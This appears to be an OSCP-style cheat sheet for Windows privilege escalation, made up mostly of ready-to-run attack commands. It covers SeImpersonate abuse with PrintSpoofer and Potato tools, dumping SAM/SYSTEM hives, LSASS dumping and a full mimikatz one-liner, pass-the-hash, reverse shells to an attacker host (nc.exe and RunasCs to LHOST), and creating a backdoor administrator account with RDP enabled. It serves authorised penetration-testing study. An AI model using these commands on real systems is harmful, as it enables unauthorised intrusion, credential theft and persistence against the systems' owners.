# Windows Privilege Escalation

## Philosophy

Windows privesc for OSCP is usually **one misconfiguration deep**:

1. Privileges (`SeImpersonate`, `SeBackup`, …)
2. Credentials lying around
3. Weak service / task / ACL
4. Token / group membership abuse

Automate *after* a manual pass so you understand the hit.

## Immediate recon (every Windows shell)

```cmd
whoami
whoami /all
whoami /priv
hostname
ipconfig /all
systeminfo
net user
net localgroup administrators
net localgroup
```

```powershell
# PowerShell history — high-value loot
type (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath

# Interesting files
Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.md,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

# Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance Win32_Service | Select Name,StartMode,PathName | Format-List

# Tasks
schtasks /query /fo LIST /v

# Permissions
icacls "C:\Program Files\Something"
```

## Automated helpers

```cmd
winpeas.exe
# or
powershell -ep bypass -f PowerUp.ps1
# In PowerUp:
Invoke-AllChecks
```

Treat output as a **todo list**, not an auto-root.

---

## High-value privilege: SeImpersonatePrivilege

### Concept

Service accounts (IIS app pools, MSSQL `NT SERVICE\…`, etc.) often have **SeImpersonatePrivilege**. Potato-family / PrintSpoofer-class tools abuse authentication negotiation to get a **SYSTEM** token.

### Detection

```cmd
whoami /priv
# look for SeImpersonatePrivilege Enabled
```

### Exploitation (PrintSpoofer)

```cmd
PrintSpoofer64.exe -i -c cmd.exe
PrintSpoofer64.exe -c "nc.exe LHOST 53 -e cmd"
```

Alternatives when PrintSpoofer fails (version / printer service differences):

```cmd
GodPotato -cmd "cmd /c whoami"
SharpEfsPotato.exe ...
JuicyPotato / JuicyPotatoNG   # older systems / specific CLSIDs
```

### Why this shows up so often

Web shells and SQL `xp_cmdshell` land you in service context — exactly the privilege class Potatoes target.

---

## High-value group: Backup Operators

### Concept

**SeBackupPrivilege** / **SeRestorePrivilege** allow reading (and with restore, writing) files regardless of DACL. Attack path:

1. Dump `SAM` + `SYSTEM` (and optionally `SECURITY`)
2. Extract local password hashes offline
3. Pass-the-hash as local Administrator

### Backup Operators path

User in **Backup Operators** → enable privilege → save registry hives → secretsdump → PTH.

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Get-SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Copy protected files
Copy-FileSeBackupPrivilege C:\Users\Administrator\Desktop\report.pdf C:\temp\x.pdf -Overwrite
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\temp\SAM -Overwrite
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\temp\SYSTEM -Overwrite
```

Alternatively (if `reg save` works in your context):

```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
```

Offline dump:

```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-psexec -hashes :NTHASH Administrator@TARGET
```

---

## Service misconfigurations

### Unquoted service path

```text
C:\Program Files\Vulnerable Service\service.exe
→ Windows may try C:\Program.exe first if writable
```

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\"
icacls "C:\Program Files\Vulnerable Service"
```

### Weak service binary ACL

If you can overwrite the service EXE or a DLL it loads:

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
# or icacls on the binary path
```

### AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```cmd
msiexec /quiet /qn /i reverse.msi
```

---

## Credential hunting

| Location | Command / idea |
|----------|----------------|
| PSReadLine history | `(Get-PSReadlineOption).HistorySavePath` |
| Saved creds | `cmdkey /list`, Windows Vault |
| Web configs | `web.config`, `connectionStrings` |
| Unattend / sysprep | `unattend.xml`, `sysprep.inf` |
| Autologon | `HKLM\...\Winlogon` DefaultPassword |
| Registry | `reg query HKLM /f password /t REG_SZ /s` (noisy) |
| LSASS | procdump / mimikatz (admin) |
| SAM | secretsdump after SYSTEM |

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# offline:
pypykatz lsa minidump lsass.dmp
```

Mimikatz one-liner (from notes — requires privileges / PPL considerations):

```text
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "sekurlsa::msv" "sekurlsa::ekeys" "sekurlsa::tickets" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "lsadump::secrets" "exit"
```

On modern systems LSASS may be protected; dump + offline parse is often cleaner.

---

## Scheduled tasks & startup

```cmd
schtasks /query /fo LIST /v
# Look for: runs as SYSTEM, writable script/binary, user-controlled path
```

```powershell
Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User
```

---

## Token impersonation / Runas

```cmd
# Known password
runas /user:DOMAIN\admin cmd
# Or RunasCs when interactive logon awkward
RunasCs.exe user password cmd.exe -r LHOST:443
```

---

## Enable RDP (post-admin)

Useful for GUI and clipboard once you have admin:

```cmd
net user simon P@ssword123 /add
net localgroup administrators simon /add
net localgroup "Remote Desktop Users" simon /add
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

Pass-the-hash RDP needs Restricted Admin / registry tweak:

```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -PropertyType DWORD -Force
```

```bash
xfreerdp /v:TARGET /u:Administrator /pth:NTHASH /cert:ignore +clipboard /dynamic-resolution
```

---

## Decision tree

```text
whoami /priv
  ├─ SeImpersonate / SeAssignPrimaryToken → Potato / PrintSpoofer
  ├─ SeBackupPrivilege / Backup Operators → SAM/SYSTEM dump
  └─ nothing special
        ├─ History / files / configs → creds → Runas / lateral
        ├─ Service ACL / unquoted / AlwaysInstallElevated → replace binary
        ├─ Scheduled task as SYSTEM + writable → hijack
        └─ Kernel / GadgetToJScript-style — last resort
```

## Report language (template)

**Vulnerability:** Service account with SeImpersonatePrivilege  
**Impact:** Privilege escalation to NT AUTHORITY\SYSTEM  
**Fix:** Run services as lower-privilege accounts without impersonation where possible; restrict who can log on as service; patch/monitor Potato-style abuse  
**Severity:** High
